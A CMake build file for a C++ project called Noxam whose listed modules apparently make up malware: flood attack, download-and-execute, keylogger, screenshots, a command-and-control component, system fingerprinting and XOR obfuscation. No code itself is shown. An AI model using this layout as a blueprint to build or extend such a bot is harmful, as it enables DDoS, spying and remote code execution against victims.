cmake_minimum_required(VERSION 3.26)
project(Noxam)

set(CMAKE_CXX_STANDARD 23)

add_executable(Noxam main.cpp
        Config/NoxamCommand.cxx
        Engine/Attack/NoxamAttakFlood.cxx
        Headers/Attack/NoxamAttackFlood.hxx
        Headers/Utils/NoxamDownloadExecute.hxx
        Engine/Utils/NoxamDownloadExecute.cxx
        Headers/Utils/NoxamGate.hxx
        Headers/Utils/NoxamGateHelper.hxx
        Engine/Utils/NoxamGateHelper.cxx
        Engine/Net/NoxamHTTP.cxx
        Headers/Net/NoxamHTTP.hxx
        Engine/Utils/NoxamKeylogger.cxx
        Headers/Utils/NoxamKeylogger.hxx
        Engine/Temperature/NoxamOSCPUChecker.cxx
        Headers/SystemX/NoxamOSCPUChecker.hxx
        Headers/SystemX/NoxamOSGetRAM.hxx
        Engine/Temperature/NoxamOSGetRAM.cxx
        Engine/Temperature/NoxamOSGPUChecker.cxx
        Headers/SystemX/NoxamOSHWidChecker.hxx
        Engine/Temperature/NoxamOSHWidChecker.cxx
        Headers/SystemX/NoxamOSNetVersionChecker.hxx
        Engine/Temperature/NoxamOSNetVersionChecker.cxx
        Engine/Temperature/NoxamOSVersionChecker.cxx
        Engine/CNC/NoxamPELSAdmin.cxx
        Headers/Utils/NoxamProccess.hxx
        Engine/Utils/NoxamProccess.cxx
        Engine/Utils/NoxamScreenshot.cxx
        Engine/Net/NoxamSocket.cxx
        Engine/Net/NoxamNetINIT.cxx
        Engine/Utils/NoxamSealer.cxx
        Engine/Crypto/NoxamStringOperations.cxx
        Engine/Crypto/NoxamURLEncoding.cxx
        Engine/Crypto/NoxamWebSafeEncryption.cxx
        Engine/Temperature/NoxamWebSiteChecker.cxx
        Engine/NoxamXor.cxx
        Headers/NoxamXor.hxx
        Headers/NoxamAgressiveOptimize.hxx
        Headers/NoxamAgressiveOptimize.hxx)
